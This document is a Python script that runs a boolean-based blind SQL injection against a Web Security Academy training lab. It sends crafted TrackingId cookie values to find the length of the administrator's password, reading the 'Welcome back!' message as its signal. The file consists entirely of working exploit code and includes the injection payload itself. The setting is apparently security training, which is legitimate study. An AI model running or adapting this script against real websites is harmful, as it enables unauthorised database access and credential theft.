import urllib.parse
import sys
import requests
from bs4 import BeautifulSoup
import time

site = 'acc11f0e1fee3ba381ff5407003f006d.web-security-academy.net'
url = f'https://{site}/'


def try_query(query):
    print(f'Query: {query}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query)}
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False


begin_time = time.perf_counter()
num = 1
while True:
    query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
    print(f'Trying length {num}')
    if not try_query(query):
        num = num + 1
    else:
        break

print(f"Password length is {num}")
print(f"Time elapsed is {time.perf_counter() - begin_time}")
